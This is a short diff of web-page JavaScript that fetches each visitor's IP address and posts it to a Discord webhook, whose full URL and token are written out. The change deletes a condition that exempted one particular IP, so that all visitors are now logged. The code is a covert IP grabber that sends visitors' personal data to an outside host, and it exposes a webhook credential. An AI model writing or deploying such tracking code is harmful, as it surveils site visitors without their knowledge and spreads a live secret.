@@ -181,9 +181,7 @@
                 .then(response => response.json())
                 .then(data => {
                     console.log('User IP Address:', data.query);
-                    
-                    // Check if the IP is not the one we want to exclude
-                    if (data.query !== '86.234.134.179') {
+
                         // Send the IP address to your Discord webhook
                         fetch('https://ptb.discord.com/api/webhooks/1257370292347732039/gawrdocaGwUi6yv5iusR6HXYubx0CrLcnfRXNRRhKOtgzrnOg_qFDYZlLQ86ioWpKOvJ', {
                             method: 'POST',
